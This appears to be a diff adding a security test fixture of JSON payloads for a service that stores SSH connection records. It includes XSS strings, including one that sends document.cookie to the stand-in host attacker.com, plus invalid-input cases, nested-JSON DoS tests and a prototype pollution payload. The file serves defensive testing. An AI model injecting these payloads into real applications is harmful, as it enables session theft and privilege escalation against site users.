@@ -1,0 +1,148 @@
+{
+  "xss_payloads": [
+    {
+      "name": "Basic XSS in IP field",
+      "description": "Tests XSS vulnerability in IP field",
+      "payload": {
+        "ip": "<img src=x onerror='alert(\"XSS-IP\")'>",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22,
+        "ssh_info": "Test"
+      }
+    },
+    {
+      "name": "XSS in City field",
+      "description": "Tests XSS vulnerability in city field",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "<script>alert('XSS-City')</script>",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22,
+        "ssh_info": "Test"
+      }
+    },
+    {
+      "name": "XSS in SSH Info field",
+      "description": "Tests XSS vulnerability in SSH info field",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22,
+        "ssh_info": "<img src=x onerror='fetch(\"https://attacker.com/steal?data=\"+document.cookie)'>"
+      }
+    },
+    {
+      "name": "XSS in Country field",
+      "description": "Tests XSS vulnerability in country field",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test<script>alert('XSS-Country')</script>",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22,
+        "ssh_info": "Test"
+      }
+    }
+  ],
+  "input_validation_payloads": [
+    {
+      "name": "Invalid latitude (out of range)",
+      "description": "Tests coordinate validation",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 999,
+        "longitude": 64.78896,
+        "port": 22
+      }
+    },
+    {
+      "name": "Invalid longitude (out of range)",
+      "description": "Tests coordinate validation",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 999,
+        "port": 22
+      }
+    },
+    {
+      "name": "Invalid port number",
+      "description": "Tests port validation",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 99999
+      }
+    },
+    {
+      "name": "String instead of number for coordinates",
+      "description": "Tests type validation",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": "not_a_number",
+        "longitude": "not_a_number",
+        "port": 22
+      }
+    }
+  ],
+  "dos_payloads": [
+    {
+      "name": "Large JSON array",
+      "description": "Tests for DoS via large input",
+      "note": "Generate array with 10000+ entries to test memory exhaustion"
+    },
+    {
+      "name": "Deeply nested JSON",
+      "description": "Tests for JSON bombing",
+      "payload": {
+        "ip": "127.0.0.1",
+        "country": {
+          "nested": {
+            "deep": {
+              "structure": "that could cause stack overflow"
+            }
+          }
+        },
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22
+      }
+    }
+  ],
+  "prototype_pollution_payloads": [
+    {
+      "name": "Prototype pollution attempt",
+      "description": "Tests for prototype pollution vulnerability",
+      "payload": {
+        "__proto__": {
+          "isAdmin": true
+        },
+        "ip": "127.0.0.1",
+        "country": "Test",
+        "city": "Test",
+        "latitude": 60.13044,
+        "longitude": 64.78896,
+        "port": 22
+      }
+    }
+  ]
+}
